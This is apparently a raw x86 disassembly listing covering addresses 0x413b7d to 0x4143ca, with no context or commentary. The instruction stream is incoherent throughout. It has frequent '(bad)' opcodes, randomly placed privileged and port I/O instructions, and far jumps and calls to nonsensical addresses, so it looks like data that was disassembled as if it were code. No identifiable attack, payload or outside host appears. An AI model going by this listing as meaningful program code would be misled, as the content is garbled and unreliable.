  413b7d:	ja     0x413b3d
  413b7f:	push   esi
  413b80:	loop   0x413bba
  413b82:	jmp    0x413bee
  413b84:	cwde   
  413b85:	rol    BYTE PTR [ecx],0xbc
  413b88:	sbb    DWORD PTR [ecx+0x2e5f279b],eax
  413b8e:	sub    DWORD PTR [esi+edi*2-0x4e],ecx
  413b92:	loop   0x413b15
  413b94:	arpl   sp,dx
  413b96:	pop    ebp
  413b97:	inc    edi
  413b98:	xor    BYTE PTR [ebx-0x71],0x3b
  413b9c:	xchg   esp,eax
  413b9d:	or     ebp,DWORD PTR [ebx-0xd]
  413ba0:	enter  0x6383,0xe7
  413ba4:	fsubr  DWORD PTR [ebx-0x4b]
  413ba7:	pop    edx
  413ba8:	and    DWORD PTR [ecx+0x56425e0a],edi
  413bae:	clc    
  413baf:	daa    
  413bb0:	repz es sbb eax,0xe1f6c85c
  413bb7:	lea    ecx,[esi]
  413bb9:	push   eax
  413bba:	jns    0x413b47
  413bbc:	sub    DWORD PTR [eax-0x17781e2],ebx
  413bc2:	int    0x50
  413bc4:	repz xor eax,0xe840ec58
  413bca:	repz add DWORD PTR [eax+0x6c863f2b],ecx
  413bd1:	and    cl,BYTE PTR [edi+0x49ba845b]
  413bd7:	add    dl,cl
  413bd9:	cli    
  413bda:	retf   
  413bdb:	xchg   DWORD PTR [ebp-0xd564d92],esi
  413be1:	shr    DWORD PTR [ebx],cl
  413be3:	mov    edi,DWORD PTR [edi+0x5f]
  413be6:	mov    edi,0xe53df23d
  413beb:	push   0xffffffde
  413bed:	pop    ebp
  413bee:	push   ss
  413bef:	test   al,0x75
  413bf1:	(bad)  
  413bf2:	xchg   edi,eax
  413bf3:	lods   al,BYTE PTR ds:[esi]
  413bf4:	adc    ebx,edx
  413bf6:	xor    dh,dl
  413bf8:	mov    ebp,0x782a8bba
  413bfd:	or     ebp,DWORD PTR [edx+0x5b]
  413c00:	xchg   ecx,eax
  413c01:	(bad)  
  413c02:	retf   
  413c03:	lock mov al,ds:0xa7c94679
  413c09:	shr    al,cl
  413c0b:	in     al,0xd
  413c0d:	jg     0x413c70
  413c0f:	aam    0x8
  413c11:	out    dx,eax
  413c12:	push   ebp
  413c13:	scas   eax,DWORD PTR es:[edi]
  413c14:	imul   eax,DWORD PTR [ebp+0x7c],0xfa6ef618
  413c1b:	mov    al,0x90
  413c1d:	xchg   ebx,eax
  413c1e:	adc    edi,esp
  413c20:	pusha  
  413c21:	inc    ebx
  413c22:	pop    edi
  413c23:	cli    
  413c24:	sub    DWORD PTR [edx],esi
  413c26:	xchg   ebp,eax
  413c27:	cmp    bl,ah
  413c29:	cld    
  413c2a:	cli    
  413c2b:	or     ecx,ecx
  413c2d:	dec    edx
  413c2e:	xchg   DWORD PTR [edx+0x6a6a89db],edi
  413c34:	loop   0x413be7
  413c36:	lods   al,BYTE PTR ds:[esi]
  413c37:	pop    ecx
  413c38:	mov    ecx,0x5e1f1f5
  413c3d:	daa    
  413c3e:	inc    esi
  413c3f:	mov    al,ds:0xbe0a2bd4
  413c44:	sahf   
  413c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c46:	fist   WORD PTR [edx-0x180aecb]
  413c4c:	call   0xa88a4ced
  413c51:	or     eax,0x51999bc5
  413c56:	gs hlt 
  413c58:	jmp    0x9366ed50
  413c5d:	jp     0x413cd2
  413c5f:	in     eax,0xc6
  413c61:	mov    dh,0x45
  413c63:	mov    dl,0xe1
  413c65:	repz imul eax,DWORD PTR [ebx],0x14
  413c69:	sbb    DWORD PTR [ecx-0x5daa5ea6],edi
  413c6f:	xchg   ebx,eax
  413c70:	and    BYTE PTR [ecx],bh
  413c72:	sahf   
  413c73:	xchg   BYTE PTR [edi-0xf6f2b10],al
  413c79:	inc    esi
  413c7a:	jp     0x413c34
  413c7c:	push   edx
  413c7d:	ret    0x8436
  413c80:	cs and eax,0x9c667d1c
  413c86:	sub    al,0x1f
  413c88:	sub    DWORD PTR [edx],edi
  413c8a:	sbb    al,0x97
  413c8c:	frstor [edx+0x59]
  413c8f:	xchg   ebx,eax
  413c90:	inc    esp
  413c91:	ss cld 
  413c93:	inc    esi
  413c94:	push   ebp
  413c95:	ds jbe 0x413c6c
  413c98:	gs scas al,BYTE PTR es:[edi]
  413c9a:	add    ch,cl
  413c9c:	imul   esp,ebp,0xcb5ee7c0
  413ca2:	hlt    
  413ca3:	ficomp DWORD PTR [esi]
  413ca5:	loopne 0x413cc3
  413ca7:	jns    0x413cba
  413ca9:	cdq    
  413caa:	add    cl,al
  413cac:	out    dx,al
  413cad:	cli    
  413cae:	(bad)  
  413caf:	jmp    0x3c3775c9
  413cb4:	mov    dh,0x8e
  413cb6:	dec    ebp
  413cb7:	pop    edi
  413cb8:	sub    al,ch
  413cba:	scas   al,BYTE PTR es:[edi]
  413cbb:	daa    
  413cbc:	sub    DWORD PTR [ecx-0x7fbe4e3a],0x56
  413cc3:	retf   
  413cc4:	mov    cl,0x18
  413cc6:	mov    DWORD PTR [eax+0x30a2647a],esi
  413ccc:	js     0x413d05
  413cce:	cmp    ebx,DWORD PTR [edx+ebp*2+0x79506a60]
  413cd5:	lods   eax,DWORD PTR ds:[esi]
  413cd6:	inc    ebp
  413cd7:	jmp    0x5446:0x9d6c20cf
  413cde:	adc    eax,0x84bb3674
  413ce3:	ror    BYTE PTR [ecx-0x47],cl
  413ce6:	gs pop edx
  413ce8:	or     al,0x9b
  413cea:	inc    ecx
  413ceb:	and    BYTE PTR [ebp-0x5d234e1],ah
  413cf1:	pop    ebp
  413cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf3:	out    dx,al
  413cf4:	imul   esi,ebp,0xa6f55fdc
  413cfa:	and    BYTE PTR gs:[edx-0x25],cl
  413cfe:	sub    BYTE PTR [edx-0x3fce7480],cl
  413d04:	pusha  
  413d05:	repnz cli 
  413d07:	mov    ecx,0x5c2a5f4
  413d0c:	imul   edi,DWORD PTR [eax],0x30
  413d0f:	jg     0x413d85
  413d11:	ds in  al,0x90
  413d14:	xlat   BYTE PTR ds:[ebx]
  413d15:	pop    esp
  413d16:	nop
  413d17:	inc    esi
  413d18:	adc    dh,BYTE PTR [esi-0x4befa1a2]
  413d1e:	sub    ah,BYTE PTR ds:0xe004f43f
  413d24:	pop    ebx
  413d25:	adc    dl,BYTE PTR [eax+0x7553d172]
  413d2b:	add    ebp,eax
  413d2d:	test   esp,esp
  413d2f:	int3   
  413d30:	rol    DWORD PTR [esi],0x4c
  413d33:	jmp    0x6c3344ea
  413d38:	(bad)  
  413d39:	repz out 0xba,eax
  413d3c:	in     al,0xbf
  413d3e:	jno    0x413dbf
  413d40:	fbld   TBYTE PTR [edx+ecx*4]
  413d43:	inc    ecx
  413d44:	mov    eax,0xc920a6e9
  413d49:	outs   dx,BYTE PTR ds:[esi]
  413d4a:	xchg   edx,eax
  413d4b:	adc    edi,DWORD PTR [edx-0x6c54f03c]
  413d51:	pop    ecx
  413d52:	mov    ecx,0x612a9f0d
  413d57:	(bad)  
  413d58:	sar    DWORD PTR [eax+0x44ef9abd],1
  413d5e:	fmul   DWORD PTR [esi-0x75]
  413d61:	inc    eax
  413d62:	scas   al,BYTE PTR es:[edi]
  413d63:	popa   
  413d64:	xchg   edx,edi
  413d66:	aad    0xa5
  413d68:	jecxz  0x413d72
  413d6a:	test   DWORD PTR [ecx+0x6],ebx
  413d6d:	pop    ss
  413d6e:	xlat   BYTE PTR ds:[ebx]
  413d6f:	and    bl,BYTE PTR [edi-0x7d8b17bc]
  413d75:	or     ebp,edx
  413d77:	push   es
  413d78:	mov    al,BYTE PTR [edx+0x239374c3]
  413d7e:	hlt    
  413d7f:	dec    ebp
  413d80:	out    0x39,al
  413d82:	sbb    eax,0x145a61e0
  413d87:	and    bh,dh
  413d89:	inc    ebx
  413d8a:	jae    0x413d60
  413d8c:	rcl    BYTE PTR [esi],cl
  413d8e:	sar    eax,0xa9
  413d91:	push   es
  413d92:	mov    edi,0x6222077
  413d97:	or     ch,BYTE PTR [edx+0x72]
  413d9a:	push   es
  413d9b:	aad    0x5a
  413d9d:	int3   
  413d9e:	push   esi
  413d9f:	sbb    al,0x77
  413da1:	pusha  
  413da2:	mov    edi,0xa0e7dd2c
  413da7:	xchg   esp,eax
  413da8:	scas   eax,DWORD PTR es:[edi]
  413da9:	adc    eax,0x2a6ed6eb
  413dae:	inc    eax
  413daf:	jne    0x413db9
  413db1:	es xchg ebp,eax
  413db3:	xor    DWORD PTR [ecx-0x1608da80],0xffffffc9
  413dba:	gs mov al,0xcd
  413dbd:	mov    ds,WORD PTR [edi+0xa04681b]
  413dc3:	mov    esi,0xa40aa384
  413dc8:	fdiv   st(1),st
  413dca:	add    ch,BYTE PTR [ebx+0x3553d6ac]
  413dd0:	gs in  eax,0x88
  413dd3:	fisubr DWORD PTR [ecx+0x76]
  413dd6:	push   0x4df10a59
  413ddb:	retf   0x37d4
  413dde:	xor    BYTE PTR [ecx],bl
  413de0:	mov    ebp,DWORD PTR [ebp+0x67]
  413de3:	sub    bl,ah
  413de5:	loope  0x413df7
  413de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de8:	fcomp  QWORD PTR [edx+0x31]
  413deb:	push   ecx
  413dec:	bound  ebx,QWORD PTR [edi-0x455560ba]
  413df2:	addr16 sub eax,0x68579960
  413df8:	and    al,BYTE PTR [ebx+0x4]
  413dfb:	loopne 0x413e47
  413dfd:	out    0x5b,al
  413dff:	fld    QWORD PTR [eax+ebx*4]
  413e02:	push   edx
  413e03:	fst    QWORD PTR [esi-0xbea39f0]
  413e09:	xor    edi,DWORD PTR [ecx+0x73c9b2cd]
  413e0f:	jg     0x413de2
  413e11:	cmp    al,0xd0
  413e13:	sub    eax,DWORD PTR ds:0xda781fec
  413e19:	loop   0x413dc5
  413e1b:	(bad)  
  413e1c:	popa   
  413e1d:	pop    ebp
  413e1e:	repz shl dl,1
  413e21:	iret   
  413e22:	jecxz  0x413ea2
  413e24:	cmp    eax,0x5db911ce
  413e29:	fst    QWORD PTR [edx]
  413e2b:	retf   0x73ca
  413e2e:	out    dx,al
  413e2f:	rcr    DWORD PTR [edx+0x25],0xe2
  413e33:	inc    edx
  413e35:	xchg   BYTE PTR [bx+di],bh
  413e38:	dec    esi
  413e39:	sbb    al,0x73
  413e3b:	sub    DWORD PTR ds:0x324115c,0xf135b465
  413e45:	add    ebx,DWORD PTR [ecx+0x1f337dc1]
  413e4b:	cmp    DWORD PTR [esi+0x57be289a],0x12
  413e52:	xor    DWORD PTR [edi],ecx
  413e54:	aam    0x4f
  413e56:	fdiv   DWORD PTR [ecx]
  413e58:	adc    ebp,DWORD PTR [ecx]
  413e5a:	pop    ebx
  413e5b:	add    esi,ecx
  413e5d:	sub    eax,0x332f8dff
  413e62:	cmc    
  413e63:	mov    ecx,0x37777b18
  413e68:	fstp   st(5)
  413e6a:	jle    0x413ec2
  413e6c:	add    al,0x30
  413e6e:	and    DWORD PTR gs:[ebx-0x5],esp
  413e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e73:	push   edi
  413e74:	and    dl,al
  413e76:	les    esp,FWORD PTR [edi]
  413e78:	sbb    al,0xa7
  413e7a:	jb     0x413eb2
  413e7c:	xlat   BYTE PTR ds:[ebx]
  413e7d:	mov    eax,ds:0x978ee6d4
  413e82:	in     eax,dx
  413e83:	jbe    0x413e40
  413e85:	ret    
  413e86:	mov    ebp,0x8f9d18e5
  413e8b:	mov    esp,0x22adffff
  413e90:	jecxz  0x413ee0
  413e92:	jmp    0x413e8f
  413e94:	cmc    
  413e95:	bound  esi,QWORD PTR [ecx-0x7794f580]
  413e9b:	cmc    
  413e9c:	(bad)  
  413e9d:	in     eax,dx
  413e9e:	scas   eax,DWORD PTR es:[di]
  413ea0:	add    bh,cl
  413ea2:	mov    ah,0xe9
  413ea4:	sub    ecx,esp
  413ea6:	fdiv   st,st(1)
  413ea8:	stos   DWORD PTR es:[edi],eax
  413ea9:	hlt    
  413eaa:	shl    al,cl
  413eac:	jns    0x413eeb
  413eae:	jne    0x413e48
  413eb0:	mov    eax,fs
  413eb2:	dec    esp
  413eb3:	jle    0x413eea
  413eb5:	retf   0x3cc7
  413eb8:	into   
  413eb9:	sahf   
  413eba:	sub    BYTE PTR [ecx+edi*4],dh
  413ebd:	mov    al,ds:0xf43688b4
  413ec2:	adc    DWORD PTR [esi+0x21],edx
  413ec5:	add    eax,0xc42cf307
  413eca:	(bad)  
  413ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ecc:	push   ss
  413ecd:	xor    BYTE PTR [edx],0xe0
  413ed0:	dec    eax
  413ed1:	push   eax
  413ed2:	sbb    al,0x56
  413ed4:	(bad)  
  413ed6:	(bad)  
  413ed7:	je     0x413eed
  413ed9:	ficomp DWORD PTR [ebp-0x43]
  413edc:	test   eax,0xdc73c8aa
  413ee1:	pushf  
  413ee2:	cwde   
  413ee3:	xchg   ecx,eax
  413ee4:	int    0x45
  413ee6:	mov    bh,0xab
  413ee8:	loope  0x413f63
  413eea:	dec    eax
  413eeb:	jle    0x413f09
  413eed:	inc    edx
  413eee:	in     al,0x90
  413ef0:	inc    ebx
  413ef1:	dec    ebp
  413ef2:	fisttp QWORD PTR [ecx+0x21]
  413ef5:	repnz stos BYTE PTR es:[edi],al
  413ef7:	jb     0x413e9b
  413ef9:	inc    edi
  413efa:	daa    
  413efb:	and    dh,dl
  413efd:	push   es
  413efe:	push   eax
  413eff:	add    edx,ebp
  413f01:	es mov eax,ss
  413f04:	sti    
  413f05:	cmp    eax,0x4c97bf4a
  413f0a:	sbb    ebx,ebx
  413f0c:	or     BYTE PTR [ebx+ecx*1-0x7c1f4370],ah
  413f13:	femms  
  413f15:	pushf  
  413f16:	or     esp,DWORD PTR [esi]
  413f18:	jp     0x413f41
  413f1a:	mov    cs,WORD PTR [eax-0x336a0f95]
  413f20:	lea    edi,[esi+0x51]
  413f23:	add    BYTE PTR [ebx],dl
  413f25:	mov    ebx,0xc83b0baa
  413f2a:	call   0x5b0719c3
  413f2f:	dec    ecx
  413f30:	jbe    0x413ee5
  413f32:	stos   BYTE PTR es:[edi],al
  413f33:	(bad)  
  413f34:	cmp    eax,0xabcc1392
  413f39:	push   edx
  413f3a:	pop    ss
  413f3b:	and    ecx,DWORD PTR [edi-0x33]
  413f3e:	aaa    
  413f3f:	mov    cs,WORD PTR [ebx+0x6a]
  413f42:	loope  0x413f0d
  413f44:	scas   al,BYTE PTR es:[edi]
  413f45:	push   ebx
  413f46:	addr16 xchg ebx,eax
  413f48:	call   0x312d:0x75f31538
  413f4f:	jo     0x413f53
  413f51:	in     eax,dx
  413f52:	addr16 xchg edi,eax
  413f54:	iret   
  413f55:	add    DWORD PTR [esi+eax*2],esi
  413f58:	xchg   esi,eax
  413f59:	ret    
  413f5a:	pop    ecx
  413f5b:	and    DWORD PTR [edi+0x56],ecx
  413f5e:	aaa    
  413f5f:	sti    
  413f60:	sbb    eax,0xf8d15d21
  413f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f66:	hlt    
  413f67:	inc    esp
  413f68:	into   
  413f69:	add    DWORD PTR [ebx+0x4f5e5889],edi
  413f6f:	push   ds
  413f70:	js     0x413fb2
  413f72:	xchg   edx,eax
  413f73:	sbb    eax,0xa2de6c89
  413f78:	scas   eax,DWORD PTR es:[edi]
  413f79:	and    BYTE PTR [ebp+0x51],ah
  413f7c:	xchg   BYTE PTR [edx-0x51],dl
  413f7f:	out    0x1b,al
  413f81:	adc    eax,0xa0497437
  413f86:	jmp    0xe64537a3
  413f8b:	add    eax,0x40e252cb
  413f90:	(bad)  
  413f91:	adc    ch,BYTE PTR [esi+0x653556d1]
  413f97:	fcom   QWORD PTR [ebp-0x372037a0]
  413f9d:	psubsw mm7,QWORD PTR fs:[edi]
  413fa1:	cld    
  413fa2:	xchg   ebx,eax
  413fa3:	ret    
  413fa4:	bound  ebp,QWORD PTR [ebx-0x39]
  413fa7:	sbb    BYTE PTR [edi],dl
  413fa9:	pop    eax
  413faa:	lahf   
  413fab:	loop   0x413f39
  413fad:	push   ecx
  413fae:	imul   ebp,DWORD PTR [edx+ecx*8-0x6f5df78b],0xffffffad
  413fb6:	stos   BYTE PTR es:[edi],al
  413fb7:	aam    0xc6
  413fb9:	adc    eax,0xd54f7647
  413fbe:	pop    esi
  413fbf:	test   eax,0x36691e67
  413fc4:	in     eax,0x52
  413fc6:	push   esi
  413fc7:	mov    BYTE PTR ds:0xadb7f13d,dh
  413fcd:	adc    bh,BYTE PTR [eax-0x13b8fa11]
  413fd3:	adc    al,0xa9
  413fd5:	cli    
  413fd6:	sub    ah,al
  413fd8:	mov    bl,0x67
  413fda:	and    esi,DWORD PTR [ecx-0x7f391712]
  413fe0:	fmul   QWORD PTR [esi-0x71]
  413fe3:	dec    ebx
  413fe4:	pop    edi
  413fe5:	leave  
  413fe6:	sbb    bl,BYTE PTR [ecx-0x79]
  413fe9:	fcomip st,st(0)
  413feb:	dec    ebx
  413fec:	sub    edi,DWORD PTR [edi-0x5ed41cd1]
  413ff2:	dec    ebp
  413ff3:	in     al,0xc
  413ff5:	rcl    BYTE PTR [esi],0x95
  413ff8:	inc    ecx
  413ff9:	and    al,0xe9
  413ffb:	(bad)  
  413ffc:	or     al,BYTE PTR [edx]
  413ffe:	pop    esp
  413fff:	fsub   st,st(0)
  414001:	(bad)  
  414002:	clc    
  414003:	pop    DWORD PTR [ebp-0x76]
  414006:	mov    dh,0xfe
  414008:	or     esi,DWORD PTR [ecx-0x7cb45d77]
  41400e:	nop
  41400f:	(bad)  
  414010:	xchg   esi,eax
  414011:	fwait
  414012:	xor    ch,bh
  414014:	push   ds
  414015:	or     ebx,DWORD PTR [edx]
  414017:	fsubr  QWORD PTR [edx+edx*2-0x1d1a0bb6]
  41401e:	mov    dh,0xb8
  414020:	out    dx,al
  414021:	push   ebx
  414022:	inc    ecx
  414023:	sbb    al,0x64
  414025:	jp     0x413ffa
  414027:	call   0xf857:0x9e735585
  41402e:	push   esi
  41402f:	(bad)  
  414030:	xor    DWORD PTR [ebx-0x7818a95a],ebp
  414036:	dec    ecx
  414037:	popa   
  414038:	into   
  414039:	hlt    
  41403a:	adc    al,0x34
  41403c:	jle    0x413ffd
  41403e:	call   0x1bf:0x4630656
  414045:	dec    ebp
  414046:	test   al,0x95
  414048:	sub    DWORD PTR [edi+0x227435af],edi
  41404e:	cmp    al,0x19
  414050:	scas   eax,DWORD PTR es:[edi]
  414051:	popa   
  414052:	and    cl,BYTE PTR [edi+0x5f64b991]
  414058:	push   esi
  414059:	gs sahf 
  41405b:	jl     0x414037
  41405d:	push   eax
  41405e:	lahf   
  41405f:	cld    
  414060:	cmp    dl,BYTE PTR [eax-0x6780ccca]
  414066:	mov    DWORD PTR [ebx],ebx
  414068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414069:	ins    DWORD PTR es:[edi],dx
  41406a:	jmp    0x414009
  41406c:	sar    BYTE PTR [ebx+0xfa9fadc],0x3f
  414073:	push   es
  414074:	lock xchg DWORD PTR [ecx+0x4bed467b],edx
  41407b:	pop    esi
  41407c:	inc    esp
  41407d:	and    DWORD PTR [eax+ebx*4+0x5d],0xffffffd8
  414082:	xor    al,0x7c
  414084:	sbb    al,BYTE PTR [edi+0x7476d2dc]
  41408a:	cs aad 0xd2
  41408d:	repnz mov eax,0x3a305fc4
  414093:	and    bl,cl
  414095:	push   eax
  414096:	ss cmp eax,0x2e21e457
  41409c:	adc    BYTE PTR [edi+0x45],dh
  41409f:	mov    al,ds:0x4f9f4b51
  4140a4:	sub    al,BYTE PTR ds:0x6655bcf7
  4140aa:	leave  
  4140ab:	mov    bh,0xca
  4140ad:	or     al,BYTE PTR [ebx+0x78]
  4140b0:	mov    ds:0xfc09723f,eax
  4140b5:	out    0x93,eax
  4140b7:	enter  0x47bb,0xd8
  4140bb:	test   eax,0xa4c5363e
  4140c0:	cmp    al,0x38
  4140c2:	in     eax,0xd1
  4140c4:	fild   DWORD PTR [edx-0x79]
  4140c7:	adc    al,0x13
  4140c9:	xor    ebx,eax
  4140cb:	xchg   al,dl
  4140cd:	xchg   esi,eax
  4140ce:	pop    eax
  4140cf:	jae    0xcd95acf9
  4140d5:	fs push ebp
  4140d7:	and    ah,BYTE PTR [ecx+0x48]
  4140da:	imul   eax,DWORD PTR [eax+ebx*2+0x8ff4a9d],0xffffffe8
  4140e2:	cmp    bh,0xc
  4140e5:	jp     0x4140fe
  4140e7:	outs   dx,BYTE PTR ds:[esi]
  4140e8:	cmc    
  4140e9:	aaa    
  4140ea:	dec    edx
  4140eb:	outs   dx,BYTE PTR ds:[esi]
  4140ec:	push   0x871e2efe
  4140f1:	fst    QWORD PTR [ebp+0x68]
  4140f4:	pop    esp
  4140f5:	jns    0x414146
  4140f7:	ss daa 
  4140f9:	mov    bl,0xf3
  4140fb:	ror    DWORD PTR [ebp-0x52],0x13
  4140ff:	pop    edi
  414100:	clc    
  414101:	xor    ebx,DWORD PTR [edi+esi*8]
  414104:	fidiv  WORD PTR [esi+0x2d6d4da]
  41410a:	ins    BYTE PTR es:[edi],dx
  41410b:	or     al,0x25
  41410d:	jo     0x414134
  41410f:	jbe    0x414134
  414111:	mov    bl,0xb0
  414113:	mov    esi,eax
  414115:	and    bh,BYTE PTR [ebx-0x3671689e]
  41411b:	jmp    0xd5fa2f31
  414120:	mov    ebx,0x8bfd39b6
  414125:	into   
  414126:	xor    dh,BYTE PTR [esi+eiz*2+0x14]
  41412a:	jl     0x41416f
  41412c:	pop    edx
  41412d:	or     DWORD PTR [ebp*4-0x19c18c55],ebx
  414134:	xor    DWORD PTR [ebp+0x2c],eax
  414137:	repz (bad) 
  414139:	cmp    BYTE PTR [edi+0x401d4aa5],cl
  41413f:	xchg   ebp,ebp
  414141:	test   eax,0xbfa0b4f2
  414146:	shr    DWORD PTR [ebx+0x56eb4f83],0x7c
  41414d:	jo     0x414129
  41414f:	out    0xf7,eax
  414151:	adc    dh,BYTE PTR [ecx-0x4d]
  414154:	push   ebx
  414155:	sub    al,0x1a
  414157:	push   cs
  414158:	push   ss
  414159:	dec    eax
  41415a:	mov    ecx,0x4cf07e8d
  41415f:	inc    ebx
  414160:	arpl   WORD PTR ss:[esi+0x2f],cx
  414164:	mov    ah,0xa1
  414166:	inc    eax
  414167:	fmul   QWORD PTR [esi+0x153001bb]
  41416d:	sbb    edi,DWORD PTR ds:0x6856a79
  414173:	sbb    DWORD PTR [ecx+edi*1-0xf],eax
  414177:	sub    ebx,ecx
  414179:	sbb    DWORD PTR cs:[edx],edi
  41417c:	push   ebp
  41417d:	dec    ebp
  41417e:	and    dh,BYTE PTR [esi-0x7]
  414181:	aas    
  414182:	pop    ds
  414183:	push   esp
  414184:	mov    al,ds:0x6107c62d
  414189:	sbb    al,0xc8
  41418b:	(bad)  
  41418c:	dec    ebp
  41418d:	popa   
  41418e:	mov    esi,0x578d7478
  414193:	sbb    esi,0xffffffcb
  414196:	cmp    eax,0xaa9b82e3
  41419b:	adc    DWORD PTR [esi+0x5c827a92],ecx
  4141a1:	mov    ds:0xee5db9c,al
  4141a6:	add    DWORD PTR [edx+0x5f],0x4dd0260e
  4141ad:	lahf   
  4141ae:	adc    DWORD PTR [edi],ebp
  4141b0:	lods   al,BYTE PTR ds:[esi]
  4141b1:	and    esp,DWORD PTR [ebx-0x2169c482]
  4141b7:	cmp    ecx,DWORD PTR [ebx+0x6]
  4141ba:	or     DWORD PTR ds:0x4fd51040,esp
  4141c0:	push   esp
  4141c1:	mov    ebx,0xc9a49921
  4141c6:	add    DWORD PTR [edx+0x154ca228],0xd3f86a1f
  4141d0:	add    al,0xad
  4141d3:	aad    0x44
  4141d5:	pop    edx
  4141d6:	mov    BYTE PTR [edi],cl
  4141d8:	jg     0x414186
  4141da:	daa    
  4141db:	mov    esp,0x527c0105
  4141e0:	xor    esp,esi
  4141e2:	or     bl,BYTE PTR [edx+0x5bc33a72]
  4141e8:	test   DWORD PTR [ebx-0x3d],esp
  4141eb:	jb     0x414183
  4141ed:	jns    0x414214
  4141ef:	push   DWORD PTR [esp+eiz*2-0x1166801e]
  4141f6:	push   cs
  4141f7:	and    esp,esi
  4141f9:	xor    al,0x3
  4141fb:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141fd:	inc    esi
  4141fe:	mov    edi,ds
  414200:	lods   eax,DWORD PTR ds:[esi]
  414201:	les    eax,FWORD PTR [ecx+0x2e]
  414204:	icebp  
  414205:	cwde   
  414206:	out    dx,al
  414207:	and    eax,0xa5d6dcb2
  41420c:	test   BYTE PTR [esi+0xf],dl
  41420f:	dec    ebx
  414210:	lods   eax,DWORD PTR ds:[esi]
  414211:	sbb    esi,edi
  414213:	hlt    
  414214:	lea    ecx,[ecx*1-0x5460dce5]
  41421b:	bound  esi,QWORD PTR [edx+0x27fa8424]
  414221:	mov    bh,0x9
  414223:	std    
  414224:	xor    DWORD PTR [edx+ebx*1-0x5e],ecx
  414228:	fsubr  DWORD PTR [edx+0x90a0824]
  41422e:	add    al,0x30
  414230:	sub    al,0x92
  414232:	pop    ecx
  414233:	outs   dx,DWORD PTR ds:[esi]
  414234:	ins    BYTE PTR es:[edi],dx
  414235:	or     BYTE PTR ds:0x6aed1498,al
  41423c:	cwde   
  41423d:	and    al,0x40
  41423f:	fidivr WORD PTR [edx+ebp*8+0x7d7466c6]
  414246:	cmp    bh,dh
  414248:	mov    eax,ds:0x9f2e9788
  41424d:	fs push ebp
  41424f:	out    dx,al
  414250:	pop    ss
  414251:	jg     0x4141e9
  414253:	dec    eax
  414254:	mov    esi,0xb1047ef0
  414259:	and    BYTE PTR [ebp+edi*2+0x3d],0x6
  41425e:	fst    DWORD PTR [edx]
  414260:	popa   
  414261:	push   es
  414262:	pusha  
  414263:	fs mov ch,bh
  414266:	mov    bl,0x4b
  414268:	aaa    
  414269:	jl     0x41424e
  41426b:	rcl    edi,1
  41426d:	xor    BYTE PTR [ecx-0x27],0x77
  414271:	sub    ebp,ecx
  414273:	jp     0x414299
  414275:	pop    esi
  414276:	mov    dl,bl
  414278:	lds    edx,FWORD PTR [edx-0x66]
  41427b:	je     0x4142f5
  41427d:	shl    BYTE PTR [edi],0xab
  414280:	jle    0x41420d
  414282:	das    
  414283:	cmp    BYTE PTR ds:0x43dd9b12,ah
  414289:	sub    BYTE PTR [ebp+0x7d],al
  41428c:	sub    esp,DWORD PTR [edx+0x6fc4327a]
  414292:	daa    
  414293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414294:	ins    BYTE PTR es:[edi],dx
  414295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414296:	xchg   edx,eax
  414297:	jno    0x41425c
  414299:	into   
  41429a:	xchg   esi,eax
  41429b:	fwait
  41429c:	jns    0x414267
  41429e:	iret   
  41429f:	scas   al,BYTE PTR es:[edi]
  4142a0:	mov    bl,dh
  4142a2:	sub    ecx,DWORD PTR [ebx]
  4142a4:	fstp   TBYTE PTR [esi]
  4142a6:	dec    edi
  4142a7:	pop    ss
  4142a8:	mov    edi,0xdf027111
  4142ad:	iret   
  4142ae:	push   ebx
  4142af:	adc    dl,BYTE PTR [ebp+0x5c]
  4142b2:	idiv   edx
  4142b4:	adc    edx,DWORD PTR [edx]
  4142b6:	xchg   esp,eax
  4142b7:	pop    esi
  4142b8:	jno    0x4142c3
  4142ba:	lock add al,0xa9
  4142bd:	(bad)  
  4142be:	fcmovnbe st,st(6)
  4142c0:	adc    ch,BYTE PTR [edi+ebx*8-0x4af106]
  4142c7:	ds or  al,0x86
  4142ca:	mov    esi,0x4602c115
  4142cf:	mov    ecx,0x8cb5df32
  4142d4:	clc    
  4142d5:	lods   al,BYTE PTR ds:[esi]
  4142d6:	xlat   BYTE PTR ds:[ebx]
  4142d7:	add    BYTE PTR [esi-0x257dcb81],dh
  4142dd:	push   ds
  4142de:	mov    esi,0xe67dc69f
  4142e3:	mov    ecx,0xfa824206
  4142e8:	pop    edx
  4142e9:	mov    eax,0x18bb53be
  4142ee:	in     eax,0xbb
  4142f0:	mov    DWORD PTR fs:[ebx-0x56],ecx
  4142f4:	sahf   
  4142f5:	xchg   esi,eax
  4142f6:	adc    dh,ch
  4142f8:	mov    esp,0x8ca3ceb2
  4142fd:	cmc    
  4142fe:	retf   
  4142ff:	scas   eax,DWORD PTR es:[edi]
  414300:	and    eax,0xe29fc503
  414305:	adc    cl,BYTE PTR [eax-0x11]
  414308:	scas   al,BYTE PTR es:[edi]
  414309:	dec    esi
  41430a:	sub    edx,ecx
  41430c:	mov    cl,0xef
  41430e:	mov    esp,0xb0370ecf
  414313:	call   0xc6cd:0x8e7cb0f7
  41431a:	sub    edx,ebp
  41431c:	pop    edi
  41431d:	fmul   QWORD PTR [esp+ecx*2+0x56]
  414321:	push   0x45
  414323:	jecxz  0x4142e7
  414325:	lods   eax,DWORD PTR ds:[esi]
  414326:	shr    DWORD PTR [esi-0x7eca452c],1
  41432c:	(bad)  
  41432d:	gs sbb eax,0xd10b1bcd
  414333:	dec    ebx
  414334:	loope  0x4142e0
  414336:	out    dx,eax
  414337:	ret    0xdd60
  41433a:	mov    ?,WORD PTR [ebx+eiz*2]
  41433d:	sbb    al,0xcd
  41433f:	pop    esp
  414340:	ror    DWORD PTR [ebx+0x19],0x96
  414344:	inc    eax
  414345:	(bad)  
  414346:	cmp    eax,0xd7867cdc
  41434b:	(bad)  
  41434c:	cmp    edx,edx
  41434e:	xor    al,BYTE PTR [esi-0x9]
  414351:	out    0xae,al
  414353:	dec    ebp
  414354:	das    
  414355:	scas   eax,DWORD PTR es:[edi]
  414356:	jae    0x4143ca
